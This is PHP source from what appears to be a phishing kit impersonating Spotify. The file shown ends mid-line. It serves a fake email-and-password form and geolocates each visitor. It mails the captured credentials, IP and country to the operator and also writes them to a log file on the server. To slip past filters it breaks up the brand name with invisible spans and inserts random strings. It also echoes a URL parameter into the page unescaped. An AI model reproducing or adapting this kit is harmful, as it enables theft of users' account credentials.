<?php @error_reporting(0);
// made by Cyborg99" // https://icq.im/ra__3 "N3V3R D0WN HQ"
include'../proxy.php';
$rand = dechex(rand(0x000000, 0xFFFFFF));
$host = isset($_SERVER['SERVER_NAME'])?$_SERVER['SERVER_NAME']:'localhost';
$bert=md5 (rand(0,10000));
$bero=md5 (rand(0,100000));
$bero1=md5 (rand(0,10000));
$bero2=md5 (rand(0,10000));
$bero3=md5 (rand(0,1000));
$bero4=md5 (rand(0,1000));
$bero5=md5 (rand(0,100000));
$bero6=md5 (rand(0,10000));
$bert4=md5 (rand(0,1000));
require "../lang.php";
#################################################################################################################################
		$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
#################################################################################################################################
$dota = str_replace(".", "", $IP);
$zd = 'e';
$runa = $zd . '' . $dota;

if(isset($_POST['email'])) 
{ 
// Required field names
$required = array('email', 'pass');

// Loop over field names, make sure each one exists and is not empty
$error = false;
foreach($required as $field) {
  if (empty($_POST[$field])) {
    $error = true;
  }
}

if ($error) {
  header("Location: index.php");
  die();
} else {
##############################################################################################################################################################
include('mail.php');
##############################################################################################################################################################
		$fname = $_POST['email'];
		$lname = $_POST['pass'];

		
		$county = $_POST['county'];
		$city = $_POST['city'];
		$currencyCode = $_POST['currencyCode'];
		$timezone = $_POST['timezone'];

##############################################################################################################################################################
$MESSAGE = "<html><body><div><table cellpadding='0' cellspacing='0' align='center' border='0' bgcolor='#ffffff' style='color: rgb(34, 34, 34); font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: small; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; width: 639px;'><tr><td width='600' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'><table cellpadding='0' cellspacing='0' width='600' border='0'><tr><td align='left' style='font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 14px; line-height: 20px; color: rgb(85, 85, 85); text-align: left;'><p>Dear <font color='#008000'>".$PRONAME."</font>,<hr></p><p style=''><img border='0' src='https://1.bp.blogspot.com/-Xrkf51hrYhE/XV6xGp86chI/AAAAAAAAAHg/eO0RbRmZdbYif07iog4TpRM6uOqIY1czQCLcBGAs/s1600/SPOT.png'></p><p>
<hr><br></td></tr></table></td>
</tr>
</table>
</td>
<td width='26' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
</tr>
</table>
<table cellpadding='0' cellspacing='0' align='center' width='640' border='0' style='color: rgb(34, 34, 34); font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: small; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; width: 640px; margin: auto;'>
<tr>
<td width='20' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
<td width='800' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
<table cellpadding='0' cellspacing='0' width='320px' border='0'>
<tr>
<td align='left' style='font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 14px; line-height: 20px; color: rgb(85, 85, 85); text-align: left;'>
<strong>Card Details</strong><br>
Linked Email : <h>".$fname."</h><br>
Linked Pass  : <h>".$lname."</h><br>
</tr>
</table>
</td>
<td width='27' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
<td width='376' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
<table cellpadding='0' cellspacing='0' width='400px' border='0'>
<tr>
<td align='left' style='font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 14px; line-height: 20px; color: rgb(85, 85, 85); text-align: left;'>
<strong>User Details</strong><br>
IP  : <a href='http://ip-api.com/$IP' target='_blank'>$IP (Click for more information)</a><br>
COUNTRY  : <h> ".$COUNTRYNAME." - <font color='#FF6600'>".$COUNTRYCODE."</font> </h> <br>
BROWSER & OS  : <h>".$device_details."</h><br>
</tr>
</table>
</td>
</tr>
</table>
</div>";
$MESSAGE = wordwrap($MESSAGE,70);
##############################################################################################################################################################
		$SUBJECT = "$fname Linked email | $IP | $COUNTRYCODE";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: SPOTAsta v1 <admin$rand@$host>\n";
		mail($TO,$SUBJECT,$MESSAGE,$HEADER);
        $CODED  ="id.php?$rand=".$bert."&e$dota&country=".$COUNTRYCODE."&".md5(microtime())."&s=".sha1(microtime());
		header("Location: $CODED");
		$myfile = fopen("../rz/spoty-LINK-$bert.html", "a+") or die("Unable to open file!");
		fwrite($myfile, '-------------------------------- * Card Info * -------------------------------');
        fwrite($myfile, $MESSAGE);
        fclose($myfile);
##############################################################################################################################################################
}
}
$setting = parse_ini_file('../conf.pak'); 
        $gettfe = $setting['emole']; 
        if($gettfe == 0) 
        {$CODED  ="vb?$rand=".$bert."&d$dota&country=".$COUNTRYCODE."&".md5(microtime())."&$dota&s=".sha1(microtime());
	    header("Location: $CODED");
        }else{}
?>

<?php
$email = $_GET['em'];
$domain = substr($email, strpos($email, '@') + 1);
?>

<?php
if(isset($_GET[$runa]))
{
?>
<html id="app" lang="en" dir="ltr" class="ng-scope"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <title class="ng-binding"><?php echo $abtn; ?> - Spotıfy (<?php echo $COUNTRYCODE; ?>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $bert; ?></title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <!--<base href="/">--><base href=".">
  <link rel="icon" href="data:image/x-icon;base64,AAABAAIAEBAAAAAAIABoBAAAJgAAACAgAAAAACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAEAEAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjnExMYzxMTGIsTExgl////Af///wH///8B////Af///wH///8BExMYBRMTGJMTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY+xMTGJMTExgF////Af///wH///8BExMYBRMTGMMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYwxMTGAX///8B////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiT////ARMTGCUTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExivExMYpxMTGP8TExj/ExMY+xMTGCUTExiLExMY/xMTGP8TExirExMYTRMTGG8TExh/ExMYfxMTGFcTExgpExMYZxMTGOMTExj/ExMY/xMTGP8TExiLExMYzxMTGP8TExj/ExMY/xMTGNsTExi3ExMYnxMTGKcTExjLExMY+xMTGP8TExivExMYuxMTGP8TExj/ExMYzxMTGOsTExj/ExMY/xMTGJcTExibExMYvxMTGN8TExjHExMYrxMTGHcTExglExMYJRMTGLsTExj/ExMY/xMTGOsTExjrExMY/xMTGP8TExifExMYTRMTGCETExghExMYIRMTGDUTExhnExMYtxMTGPsTExj3ExMY8xMTGP8TExjnExMYzxMTGP8TExj/ExMY5xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGNcTExiHExMYGRMTGF8TExj/ExMYzxMTGIsTExj/ExMYs////wETExgZExMYQRMTGEETExhBExMYORMTGBX///8BExMYFRMTGHMTExjrExMY/xMTGIsTExglExMY+xMTGP8TExi/ExMYixMTGGcTExhfExMYXxMTGG8TExiTExMYxxMTGPsTExj/ExMY/xMTGPsTExgl////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExiT////Af///wETExgFExMYwxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjDExMYBf///wH///8B////ARMTGAUTExiTExMY+xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGPsTExiTExMYBf///wH///8B////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjrExMYzxMTGIsTExgl////Af///wH///8B////AQAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8oAAAAIAAAAEAAAAABACAAAAAAAIAQAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////Af///wETExhBExMYgRMTGL8TExi/ExMY7xMTGN8TExi/ExMYvxMTGIETExhB////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYgRMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM<?php echo rand(1, 9); ?>TExgR////Af///wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////Af///wH///8BExMYMRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgx////Af///wH///8B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///8BExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM////8B////Af///wH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIH///8B////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExjPExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExifExMYIf///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wH///8BExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgRMTGIETExivExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGJ8TExhhExMYEf///wETExgRExMYjxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjv////ARMTGEETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExgx////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgxExMYnxMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExhBExMYgRMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYnxMTGIETExhhExMYQRMTGEETExhBExMYYRMTGIETExivExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIETExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYnxMTGCETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYcRMTGCH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wETExghExMYURMTGIETExiBExMYvxMTGL8TExifExMYgRMTGIETExhBExMYEf///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExiP////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExifExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY3xMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYrxMTGIETExhBExMYQRMTGEETExhBExMYQRMTGEETExhRExMYgRMTGK8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYzxMTGP8TExj/ExMY/xMTGP8TExi/ExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYYf///wH///8BExMYvxMTGP8TExj/ExMY/xMTGL8TExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY3xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM8TExiPExMYQf///wH///8B////Af///wETExi/ExMY/xMTGP8TExj/ExMYgRMTGEETExj/ExMY/xMTGP8TExj/ExMYcf///wH///8BExMYIRMTGEETExiBExMYgRMTGIETExiBExMYgRMTGIETExiBExMYYRMTGEETExgR////Af///wH///8B////Af///wETExghExMYrxMTGP8TExj/ExMY/xMTGP8TExhB////ARMTGO8TExj/ExMY/xMTGP8TExhh////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExhRExMYrxMTGP8TExj/ExMY/xMTGP8TExj/ExMY7////wH///8BExMYgRMTGP8TExj/ExMY/xMTGP8TExifExMYYRMTGDH///8B////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wETExgRExMYQRMTGHETExivExMY7xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExiB////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYvxMTGL8TExi/ExMYvxMTGL8TExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////Af///wETExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiB////Af///wH///8B////Af///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYz////wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////ARMTGDETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYMf///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYzxMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExiBExMY7xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYgRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIETExgR////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExiBExMYvxMTGL<?php echo rand(1, 9); ?>TExjvExMY7xMTGL<?php echo rand(1, 9); ?>TExi/ExMYgRMTGEH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////Af///wH///8B////AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
  <link href="../libs/index.css" media="screen" rel="stylesheet">
  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script type="text/javascript" src="https://ssl.geoplugin.net/javascript.gp?k=d4ca3f36a4e92551"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@8"></script>
  <script type="text/javascript" src="../libs//jquery.Validator.js"></script>
</head>
<body ng-controller="LoginController" class="ng-scope">
<header id="js-navbar" class="navbar navbar-default navbar-static-top " role="banner">
<div class="container">
<div class="navbar-header">
<button type="button" class="navbar-toggle collapsed" data-toggle="sidepanel" data-target="#navbar-nav">
<span class="sr-only"><?php echo $bert; ?></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<ul class="nav">
<li class="dropdown">
<a onclick="geo()" class="user-link dropdown-toggle hidden-xs hidden-sm"><div class="user-icon-container img-circle navbar-user-img"><svg class="user-icon"><use xlink:href="#user-icon"></use></svg></div></a>
<a onclick="geo()" class="user-link hidden-md hidden-lg"><div class="user-icon-container img-circle navbar-user-img"><svg class="user-icon"><use xlink:href="#user-icon"></use></svg></div></a>
<ul class="dropdown-menu dropdown-menu-right">
<li><a></a></li>
<li><a></a></li>
</ul>
</li>
</ul>
<a onclick="geo()" class="user-link hidden"><div class="user-icon-container img-circle navbar-user-img"><svg class="user-icon"><use xlink:href="#user-icon"></use></svg></div></a>
<a class="navbar-brand"><span class="navbar-logo"><?php echo $bert; ?></span></a>
</div>
<div class="collapse navbar-collapse" id="navbar-nav">
<ul class="nav navbar-nav navbar-right"><li class="sidepanel-item-large hidden-md hidden-lg "></li>
<li class="sidepanel-item-large hidden-md hidden-lg "></li>
<li class="dropdown alternate hidden-sidepanel">
<a onclick="geo()" class="user-link dropdown-toggle">
<div class="user-icon-container img-circle navbar-user-img">
<svg class="user-icon"><use xlink:href="#user-icon"></use><svg id="user-icon" viewBox="0 0 1024 1024"> <path d="m730.06 679.64q-45.377 53.444-101.84 83.443t-120 29.999q-64.032 0-120.75-30.503t-102.6-84.451q-40.335 13.109-77.645 29.747t-53.948 26.722l-17.142 10.084q-29.747 19.159-51.175 57.729t-21.428 73.107 25.461 59.242 60.754 24.705h716.95q35.293 0 60.754-24.705t25.461-59.242-21.428-72.603-51.679-57.225q-6.554-4.033-18.907-10.84t-51.427-24.453-79.409-30.755zm-221.84 25.72q-34.285 0-67.561-14.873t-60.754-40.335-51.175-60.502-40.083-75.124-25.461-84.451-9.075-87.728q0-64.032 19.915-116.22t54.452-85.964 80.67-51.931 99.072-18.151 99.072 18.151 80.67 51.931 54.452 85.964 19.915 116.22q0 65.04-20.167 130.58t-53.948 116.72-81.426 83.443-98.568 32.268z"></path> </svg></div>
<span class="user-text"><?php echo $profidosicv; ?></span>
<svg class="svg-chevron-down"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#chevron-down"></use></svg>
</a>
</li>
</ul>
</div>
</div>
</header>
<div ng-include="template" class="ng-scope">
<br>
</div>
<div dir="<?php echo $semitic;?>" class="container-fluid login ng-scope">
  <div class="content">
    <div class="row ng-scope" ng-if="showContinueLabel">
          <div  class="col-xs-12 text-center">
              <span  class="h5 ng-binding"><?php echo $lgdfgrtne; ?></span>
          </div>
    </div>
    <br>

<div class="divider"></div>

<form dir="<?php echo $semitic;?>" name="$parent.accounts" action="link.php?<?php echo $runa; ?>=<?php echo $bero4; ?>" method="post" class="ng-pristine ng-valid-sp-disallow-chars ng-invalid ng-invalid-required">
<p><?php echo $ldzpfosne; ?> <?php echo $domain; ?> <?php echo $lgebhnfgfne; ?></p>
<img src="data:image/jpeg;base64,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" alt="">
<div dir="<?php echo $semitic;?>" class="row">
        <div class="col-md-6">
            <div class="form-group">
                <label ><?php echo $aemail;?></label>
                <input type="text" id="error-13" name="email" value="<?php echo $_GET['em']; ?>" class="form-control" required>
            </div>
        </div>

        <div class="col-md-6">
            <div class="form-group">
                <label><?php echo $Passw;?></label>
                <input type="password" required="required" id="error-11" name="pass" class="form-control">
            </div>
        </div>
    </div>
    


      <div style="margin-right: 418px;" class="row row-submit">
        <div class="col-xs-12 col-sm-6">
          
        </div>
        <div class="col-xs-12 col-sm-6">
          <button style="white-space: unset;width: 300px;white-space: pre;border-radius: 2px;" dir="<?php echo $semitic;?>" style="<?php echo $space;?>" class="btn btn-block btn-green ng-binding" id="button"><?php echo $lgnriufne; ?> <?php echo $domain; ?></button>
        </div>
      </div>
    </form>

    <div class="row">
      
    </div>

    <div id="sign-up-section">
      <div class="row">
        
      </div>
    </div>


    <div class="row">
      <div class="col-xs-12">
        <div class="divider"></div>
        <p class="text-muted disclaimer text-center ng-binding">You authorise <span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>S<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>p<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>o<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>t<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>i<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>f<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>y to charge you automatically every month, until you cancel your subscription. You agree to <span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>S<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>p<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>o<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>t<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>i<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>f<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>y's <a href="https://www.u<?php echo 